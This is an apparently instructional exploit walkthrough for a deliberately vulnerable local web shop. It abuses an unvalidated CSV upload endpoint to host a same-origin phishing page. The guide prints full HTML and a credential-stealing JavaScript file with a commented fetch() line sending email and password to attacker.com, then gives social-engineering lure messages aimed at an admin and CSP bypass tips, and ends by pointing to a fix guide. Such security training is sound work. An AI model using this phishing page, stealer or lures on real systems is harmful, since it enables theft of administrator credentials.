## File Upload Vulnerability


The bulk order upload feature accepts CSV files but has **no file type validation**. Combined with serving uploads from the same domain, this allows you to upload malicious files.

---

## Step 1: Understand the Vulnerability

**What's wrong:**
- The endpoint accepts ANY file type (no `fileFilter`)
- Uploaded files are served publicly at `/uploads/`
- Files are served from the same domain as the app
- express.static serves files with correct Content-Type based on extension

**Why it's dangerous:**
- Upload `.html` file → renders in browser
- Upload `.js` file → can be loaded by uploaded HTML
- Same origin → CSP allows scripts from `/uploads/`
- Admin clicks malicious link → credentials stolen

---

## Step 2: Reconnaissance

**Find the upload endpoint:**
```
POST /api/v1/order/bulk
```

**Check if uploads are publicly accessible:**
1. Upload a normal CSV file
2. Note the filename (e.g., `orders.csv`)
3. Try visiting: `http://127.0.0.1:3000/uploads/orders.csv`
4. ✅ If you can access it → uploads are public

---

## Step 3: Create the Phishing Page

**Save this as `phishing.html`:**

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login</title>
  <link rel="stylesheet" href="login.css" />
</head>
<body>

<div class="card">
  <h2>Sign In</h2>

  <label for="email">Email</label>
  <input type="email" id="email" placeholder="you@example.com" required />

  <label for="password">Password</label>
  <input type="password" id="password" placeholder="••••••••" required />

  <button id="loginBtn">Sign In</button>
  <p id="message"></p>
</div>

<script src="steal.js"></script>

</body>
</html>
```

---

## Step 4: Create the Credential Stealer

**Save this as `steal.js`:**

```js
async function handleLogin() {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    const btn = document.getElementById('loginBtn');
    const msg = document.getElementById('message');

    if (!email || !password) {
        showMessage('Please fill in all fields.', 'error');
        return;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        showMessage('Please enter a valid email address.', 'error');
        return;
    }

    captureCredentials(email, password);    
}

function showMessage(text, type) {
    const msg = document.getElementById('message');
    msg.textContent = text;
    msg.className = type;
}

function captureCredentials(email, password) {
    // In a real attack, send to attacker's server:
    // fetch('https://attacker.com/harvest', {
    //   method: 'POST',
    //   headers: { 'Content-Type': 'application/json' },
    //   body: JSON.stringify({ 
    //     email: email, 
    //     password: password,
    //     site: 'anonbuy',
    //     timestamp: new Date().toISOString()
    //   })
    // });

    // For demo: show what was captured
    document.body.innerHTML = `
    <div style="background: #fee; padding: 30px; border: 3px solid red; max-width: 600px; margin: 50px auto; border-radius: 8px;">
      <h2 style="color: #d32f2f; margin-top: 0;">⚠️ CREDENTIALS CAPTURED</h2>
      <div style="background: white; padding: 15px; border-radius: 4px; margin: 20px 0;">
        <p><strong>Email:</strong> <code>${email}</code></p>
        <p><strong>Password:</strong> <code>${password}</code></p>
      </div>
      <h3>What just happened?</h3>
      <ul style="text-align: left;">
        <li>You uploaded malicious HTML + JavaScript to the server</li>
        <li>Files were served from the same origin (<code>/uploads/</code>)</li>
        <li>CSP allowed the script because it's from <code>'self'</code></li>
        <li>Victim entered credentials → attacker now has them</li>
      </ul>
      <p><strong>In a real attack:</strong> These credentials would be sent to <code>https://attacker.com</code> and the victim would be redirected to a real page, never knowing they were compromised.</p>
    </div>
  `;
    return false;
}

document.getElementById('loginBtn').addEventListener('click', handleLogin);

document.addEventListener('keydown', e => {
    if (e.key === 'Enter') handleLogin();
});


```

---

## Step 5: Upload Both Files

**Upload `steal.js` first:**
1. Go to the bulk upload interface
2. Select `steal.js`
3. Upload it
4. Verify: Visit `http://127.0.0.1:3000/uploads/steal.js` → should see the JavaScript code

**Upload `phishing.html` second:**
1. Select `phishing.html`
2. Upload it
3. Verify: Visit `http://127.0.0.1:3000/uploads/phishing.html` → should see the login form

---

## Step 6: Execute the Attack

**Method 1 - Direct Link (Social Engineering):**

Send the admin a message:
```
Hey, there's an issue with order processing. Can you check this report?
http://127.0.0.1:3000/uploads/phishing.html
```

**Method 2 - Hidden in Other Content:**

If the app has a messaging/notes feature, embed the link:
```html
Check this order: <a href="/uploads/phishing.html">Order #12345</a>
```

**Method 3 - Automated (if admin reviews all uploads):**

If there's an admin panel that lists all uploaded files, the admin might click your file thinking it's a legitimate order CSV.

---

## Step 7: Capture Credentials

When the admin visits `/uploads/phishing.html`:

1. They see a professional-looking login form
2. Form looks legitimate (same domain, good styling)
3. They enter their email and password
4. JavaScript captures the credentials
5. In a real attack: credentials sent to attacker's server
6. Admin is redirected to real page (they never notice)

---

## Why This Works

| Defense | Status | Why It Fails |
|---------|--------|--------------|
| **File type validation** | ❌ Missing | No `fileFilter` → accepts `.html` and `.js` |
| **CSP protection** | ⚠️ Bypassed | CSP allows `script-src 'self'` → `/uploads/steal.js` is same origin |
| **Separate upload domain** | ❌ Missing | Uploads served from main domain → same-origin policy doesn't help |
| **Content-Disposition** | ❌ Missing | Files render in browser instead of forcing download |

---

## Real-World Impact

**What attackers can do:**
- ✅ Steal admin credentials (as shown)
- ✅ Steal session cookies (if not httpOnly)
- ✅ Deploy keyloggers on admin pages
- ✅ Perform actions as the admin (CSRF)
- ✅ Exfiltrate sensitive data
- ✅ Deploy crypto miners
- ✅ Redirect to malicious sites

**Why it's critical:**
- No authentication bypass needed
- Works even with HTTPS
- Victim is on the trusted domain
- Hard to detect in logs (looks like normal file access)

---

## Testing Tips

**If it doesn't work:**
1. ✅ Check both files uploaded: `ls uploads/`
2. ✅ Visit files directly to verify they're accessible
3. ✅ Check browser console for CSP errors
4. ✅ Try in Chrome (more permissive CSP) vs Firefox
5. ✅ Verify express.static is serving `/uploads`

**If CSP blocks it:**
- Modern CSP with `script-src 'self'` should allow this
- If blocked, the app may have stricter CSP (rare)
- This is a defense that SHOULD be in place

---

## Next Steps

Now that you've exploited this vulnerability, learn how to fix it:

[Go to Fix Guide →](../fixes/file_upload.md)